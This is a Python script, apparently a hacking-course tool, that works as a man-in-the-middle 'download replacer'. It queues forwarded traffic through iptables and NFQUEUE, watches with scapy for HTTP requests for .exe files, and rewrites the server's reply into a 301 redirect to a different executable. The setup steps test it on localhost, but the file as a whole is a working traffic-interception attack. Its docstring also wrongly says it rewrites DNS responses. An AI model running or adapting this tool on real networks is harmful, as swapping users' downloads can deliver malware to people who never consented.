#########################################################################
# Author : Dhrumil Mistry
#########################################################################


#########################################################################
# If you encounter Import error after installing netfilter use command 
# sudo pip3 install --upgrade -U git+https://github.com/kti/python-netfilterqueue 

# OR use below commands

# sudo apt install libnfnetlink-dev libnetfilter-queue-dev
# pip3 install nfqp3

#########################################################################


# Steps to test this tool
# 1. cd /var/www/html
# 2. sudo touch testfile.exe
# 3. sudo python3 -m http.server 80
# 4. run this script with superuser priviliges.
# 5. open any browser
# 6. visit localhost or your host ip to check whether site is up.
# 7. request localhost/testfile.exe
# 8. now you should get prompt to download brave browser instead of testfile.exe


from os import remove
from subprocess import call
import netfilterqueue
import scapy.all as scapy


# REDIRECT = b'https://referrals.brave.com/latest/BraveBrowserSetup.exe'
# REDIRECT = b'10.0.2.15/redirect.exe'


def forward_packets():
    '''
    configures the mitm for incoming request packets
    into a queue.

    Args:
        None

    Returns:
        None
    '''

    # executing the following command
    # iptables -I FOWARD -j NFQUEUE --queue-num (any number)
    # sudo iptables -I FORWARD -j NFQUEUE --queue-num 0
    # -I -> insert (packet into a chain specified by the user)
    # -j -> jump if the packet matches the target.
    # --queue-num -> jump to specfic queue number
    call('sudo iptables -I FORWARD -j NFQUEUE --queue-num 0', shell=True)

    # for local host
    # call('sudo iptables -I INPUT -j NFQUEUE --queue-num 0', shell=True)
    # call('sudo iptables -I OUTPUT -j NFQUEUE --queue-num 0', shell=True)
    


def reset_config():
    '''
    resets the configurations changed while exectution of the program to 
    its original configuration

    Args:
        None

    Returns:
        None
    '''
    call('sudo iptables --flush', shell=True)


ack_list = []

def set_load(packet, load):
    '''sets the packet raw layer load value to the passed load value

    Args:
        packet (scapy.IP): scapy IP packet
        load (bytes): payload data as bytes

    Returns:
        scapy.IP: returns packet with load
    '''
    packet[scapy.Raw].load = load

    # since now the packet has been tampered, the new 
    # packet will have differet length and checksums
    # so we'll delete these fields and scapy will 
    # automatically calulate these for us.
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum

    return packet

def process_packet(packet):
    '''
    process received packet, everytime a packet is received.
    prints the packet received in the queue and it changes 
    the DNS response dest ip with your desired ip.

    Args:
        packet (scapy.IP): packet from netfilterqueue/iptables

    Returns:
        None
    '''
    scapy_pkt = scapy.IP(packet.get_payload())

    # HTTP layer is in the Raw layer.
    # if dport (destination port) = http (i.e. port 80) in TCP and raw layer 
    # consists of get method then, packet consists a HTTP request.
    # 
    # if sport (source port) = http (80) in TCP then the packet consists 
    # a HTTP response.
    #  
    if scapy_pkt.haslayer(scapy.Raw):
        if scapy_pkt[scapy.TCP].dport == 80:
            if b".exe" in scapy_pkt[scapy.Raw].load:
                print('[*] EXE Request Detected!')
                ack_list.append(scapy_pkt[scapy.TCP].ack)


        elif scapy_pkt[scapy.TCP].sport == 80:
            if scapy_pkt[scapy.TCP].seq in ack_list:
                print('[*] Replacing File!\n')
                ack_list.remove(scapy_pkt[scapy.TCP].seq)
                
                modified_pkt = set_load(scapy_pkt, "HTTP/1.1 301 Moved Permanently\nLocation: https://referrals.brave.com/latest/BraveBrowserSetup.exe \n\n")
                packet.set_payload(bytes(modified_pkt))
        
    packet.accept()
    

def run():
    '''Starts download replacer
    
    Args:
        None

    Returns:
        None
    '''
    print('[*] configuring packet receiver...')

    forward_packets()
    print('[*] packet receiver configured successfully.\n')

    print('[*] Creating Queue to start receiving packets.')
    try:
        queue = netfilterqueue.NetfilterQueue()
        # Bind queue with queue-number 0
        queue.bind(0, process_packet)
        queue.run()

    except OSError as e:
        print('[-] Run script with root priviliges.')
        print(e)

    except KeyboardInterrupt:
        print('\r[-] Keyboard Interrupt detected!')

    except Exception:
        print('[-] An Exception occurred while creating queue.\n', Exception)

    finally:
        print('[*] Restoring previous configurations.. please be patient...')
        reset_config()

        print('[-] Program stopped.')


if __name__ == '__main__':
    run()
